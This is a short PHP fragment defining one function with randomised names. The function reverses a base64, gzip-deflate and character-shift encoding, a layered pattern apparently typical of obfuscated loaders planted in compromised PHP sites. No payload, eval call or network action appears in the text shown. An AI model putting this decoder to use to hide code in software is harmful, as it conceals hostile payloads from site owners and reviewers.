<?php function AivT($zEMuyJ)
{ 
$zEMuyJ=gzinflate(base64_decode($zEMuyJ));
 for($i=0;$i<strlen($zEMuyJ);$i++)
 {
$zEMuyJ[$i] = chr(ord($zEMuyJ[$i])-1);
 }
 return $zEMuyJ;
 }?>